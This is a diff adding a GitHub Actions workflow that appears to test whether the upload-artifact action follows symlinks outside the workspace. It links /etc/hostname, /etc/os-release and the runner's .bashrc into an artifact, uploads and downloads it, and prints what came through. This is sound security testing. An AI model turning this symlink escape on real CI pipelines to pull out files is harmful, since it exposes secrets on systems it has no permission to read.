@@ -1,0 +1,54 @@
+name: Artifact Upload Symlink Escape PoC
+on:
+  workflow_dispatch:
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create workspace with symlink pointing outside
+        run: |
+          mkdir -p build-output
+          echo "This is a legitimate build artifact" > build-output/real-file.txt
+          
+          # Create symlinks pointing OUTSIDE the workspace
+          ln -s /etc/hostname build-output/hostname-link
+          ln -s /etc/os-release build-output/os-release-link
+          ln -s /home/runner/.bashrc build-output/bashrc-link
+          
+          echo "=== Workspace contents ==="
+          ls -la build-output/
+          echo ""
+          echo "=== Symlink targets ==="
+          readlink -f build-output/hostname-link
+          readlink -f build-output/os-release-link
+          readlink -f build-output/bashrc-link
+      
+      - name: Upload artifact (should boundary-check fail on symlinks)
+        uses: actions/upload-artifact@v4
+        with:
+          name: symlink-escape-test
+          path: build-output/
+      
+      - name: Download and verify what was uploaded
+        uses: actions/download-artifact@v4
+        with:
+          name: symlink-escape-test
+          path: downloaded/
+      
+      - name: Check downloaded contents
+        run: |
+          echo "=== Downloaded files ==="
+          ls -la downloaded/
+          echo ""
+          echo "=== hostname-link content ==="
+          cat downloaded/hostname-link 2>&1 || echo "NOT UPLOADED"
+          echo ""
+          echo "=== os-release-link content ==="
+          cat downloaded/os-release-link 2>&1 || echo "NOT UPLOADED"
+          echo ""
+          echo "=== bashrc-link content ==="
+          cat downloaded/bashrc-link 2>&1 || echo "NOT UPLOADED"
+          echo ""
+          echo "=== real-file.txt content ==="
+          cat downloaded/real-file.txt
